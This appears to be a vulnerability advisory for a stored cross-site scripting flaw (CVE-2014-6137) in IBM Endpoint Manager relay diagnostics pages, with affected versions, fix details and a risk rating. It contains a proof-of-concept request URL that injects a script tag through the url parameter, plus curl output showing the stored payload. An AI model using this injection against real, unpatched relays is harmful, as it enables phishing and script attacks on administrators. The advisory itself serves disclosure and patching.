@@ -1,0 +1,110 @@
+id: 23279
+date: 02/10/2015
+title: IBM Endpoint Manager 9.1.x / 9.2.x Cross Site Scripting Vulnerability
+author: RedTeam
+cves: CVE-2014-6137
+
+Product: IBM Endpoint Manager
+Affected Versions:  9.1.x versions earlier than 9.1.1229,
+                    9.2.x versions earlier than 9.2.1.48
+Fixed Versions: 9.1.1229, 9.2.1.48
+Vulnerability Type: Cross-Site Scripting
+Security Risk: medium
+Vendor URL: http://www-03.ibm.com/software/products/en/endpoint-manager-family
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2014-013
+Advisory Status: published
+CVE:  CVE-2014-6137
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6137
+
+
+Introduction
+============
+
+IBM Endpoint Manager products - built on IBM BigFix technology - can
+help you achieve smarter, faster endpoint management and security. These
+products enable you to see and manage physical and virtual endpoints
+including servers, desktops, notebooks, smartphones, tablets and
+specialized equipment such as point-of-sale devices, ATMs and
+self-service kiosks. Now you can rapidly remediate, protect and report
+on endpoints in near real time.
+
+(from the vendor's homepage)
+
+
+More Details
+============
+
+Systems that run IBM Endpoint Manager (IEM, formerly Tivoli Endpoint
+Manager, or TEM) components, such as TEM Root Servers or TEM Relays,
+typically serve HTTP and HTTPS on port 52311. There, the server or relay
+diagnostics page is normally accessible at the path /rd. That page can
+be accessed without authentication and lets users query and modify
+different information. For example, a TEM Relay can be instructed to
+gather a specific version of a certain Fixlet site by requesting a URL
+such as the following:
+
+http://tem-relay.example.com:52311/cgi-bin/bfenterprise/
+  BESGatherMirrorNew.exe/-gatherversion
+  ?Body=GatherSpecifiedVersion
+  &url=http://tem-root.example.com:52311/cgi-bin/bfgather.exe/actionsite
+  &version=1
+  &useCRC=0
+
+The URL parameter url is susceptible to cross-site scripting. When the
+following URL is requested, the browser executes the JavaScript code
+provided in the parameter:
+
+http://tem-relay.example.com:52311/cgi-bin/bfenterprise/
+  BESGatherMirrorNew.exe/-gatherversion
+  ?Body=GatherSpecifiedVersion
+  &version=1
+  &url=http://"><script>alert(/XSS/)</script>
+  &version=1
+  &useCRC=0
+
+The value of that parameter is also stored in the TEM Relay's site list,
+so that the embedded JavaScript code is executed whenever the
+diagnostics page is opened in a browser:
+
+$ curl http://tem-relay.example.com:52311/rd
+[...]
+
+<select NAME="url">
+[...]
+    <option>http://"><script>alert(/XSS/)</script></option>
+</select>
+
+
+Proof of Concept
+================
+
+http://tem-relay.example.com:52311/cgi-bin/bfenterprise/
+  BESGatherMirrorNew.exe/-gatherversion
+  ?Body=GatherSpecifiedVersion&version=1
+  &url=http://"><script>alert(/XSS/)</script>
+  &version=1
+  &useCRC=0
+
+
+Fix
+===
+
+Upgrade IBM Endpoint Manager to version 9.1.1229 or 9.2.1.48.
+
+
+Security Risk
+=============
+
+As the relay diagnostics page is typically not frequented by
+administrators and does not normally require authentication, it is
+unlikely that the vulnerability can be exploited to automatically and
+reliably attack administrative users and obtain their credentials.
+
+Nevertheless, the ability to host arbitrary HTML and JavaScript code on
+the relay diagnostics page, i.e. on a trusted system, may allow
+attackers to conduct very convincing phishing attacks.
+
+This vulnerability is therefore rated as a medium risk.
+
+#  0day.today [2023-03-26]  #
